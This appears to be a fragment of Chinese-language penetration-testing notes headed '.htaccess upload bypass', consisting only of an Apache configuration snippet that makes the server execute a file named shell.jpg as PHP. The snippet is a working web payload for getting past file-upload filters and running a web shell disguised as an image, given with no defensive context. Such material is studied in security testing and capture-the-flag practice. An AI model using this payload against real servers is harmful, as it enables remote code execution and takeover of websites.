### `.htaccess`上传绕过
```php
<FilesMatch "shell.jpg">
  SetHandler application/x-httpd-php
</FilesMatch>
```